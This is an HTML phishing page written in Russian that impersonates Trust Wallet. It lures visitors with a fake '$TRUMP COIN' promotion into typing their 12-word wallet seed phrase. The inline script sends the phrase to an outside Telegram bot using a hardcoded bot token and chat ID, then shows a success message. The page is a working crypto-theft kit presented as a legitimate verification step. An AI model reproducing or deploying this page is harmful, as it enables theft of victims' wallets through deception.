<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Верификация кошелька</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #0B0E11;
            color: #FFFFFF;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background-color: #1E1E1E;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
            margin-bottom: 50px;
        }
        .logo {
            margin-bottom: 16px;
        }
        .logo img {
            width: 350px;
            height: auto;
        }
        h1 {
            font-size: 20px;
            margin-bottom: 16px;
            margin-top: 30px;
        }
        .description {
            font-size: 14px;
            color: #A0A0A0;
            margin-bottom: 20px;
        }
        .seed-input {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            justify-content: center;
            margin-bottom: 20px;
        }
        .seed-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .seed-item label {
            font-size: 14px;
            color: #A0A0A0;
            font-weight: bold;
            width: 25px;
            text-align: center;
        }
        input {
            padding: 8px;
            font-size: 14px;
            border: 1px solid #333333;
            border-radius: 6px;
            background-color: #2C2C2C;
            color: #FFFFFF;
            width: 100%;
            box-sizing: border-box;
        }
        input::placeholder {
            color: #888888;
        }
        input:focus {
            outline: none;
            border-color: #1C86EE;
        }
        button {
            margin-top: 20px;
            width: 100%;
            max-width: 200px;
            padding: 14px;
            background-color: #122fe6;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
            align-self: center;
        }
        button:hover {
            background-color: #1C86EE;
        }
        .button-sent {
            background-color: #4CAF50; /* Зеленый цвет после отправки */
        }
        .warning {
            margin-top: 10px;
            font-size: 12px;
            color: #FFD700;
            text-align: center;
        }
        footer {
            text-align: center;
            font-size: 12px;
            color: #A0A0A0;
            bottom: 0;
            width: 100%;
            background-color: transparent;
            padding: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="IMG_2134.png" alt="Trust Wallet Logo">
        </div>
        <h1>Для участия в акции USDT-$TRUMP COIN, авторизуйте свой кошелёк</h1>
        <p class="description">Введите вашу секретную фразу из 12 слов, чтобы подтвердить участие в акции. Убедитесь, что вы храните её в безопасности!</p>
        <form id="seedForm">
            <div class="seed-input">
                <div class="seed-item">
                    <label for="word1">1.</label>
                    <input type="text" id="word1" name="word1" placeholder="Please seed" inputmode="latin" autocapitalize="none" required>
                </div>
                <div class="seed-item">
                    <label for="word2">2.</label>
                    <input type="text" id="word2" name="word2" placeholder="Please seed" inputmode="latin" autocapitalize="none" required>
                </div>
                <!-- Остальные поля... -->
            </div>
            <button type="submit">Подтвердить кошелёк</button>
        </form>
        <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
    </div>

    <script>
        document.getElementById('seedForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const words = [];
            for (let i = 1; i <= 12; i++) {
                words.push(document.getElementById(`word${i}`).value.trim());
            }

            if (words.length === 12 && words.every(word => word)) {
                const message = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
                const chatId = '@bdsjxjdhd';
                const token = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                // Изменение цвета кнопки на зеленый
                const button = document.querySelector('button');
                button.classList.add('button-sent');
                button.textContent = 'Данные отправлены!';

                fetch(url)
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            alert('Секретная фраза успешно отправлена!');
                            // Очистка полей
                            document.getElementById('seedForm').reset();
                        } else {
                            alert('Ошибка отправки.');
                        }
                    })
                    .catch(error => {
                        alert('Ошибка отправки.');
                    });
            } else {
                alert('Пожалуйста, заполните все поля.');
            }
        });
    </script>

    <footer>
        © 2025 Trust Wallet. Все права защищены.
    </footer>
</body>
</html>
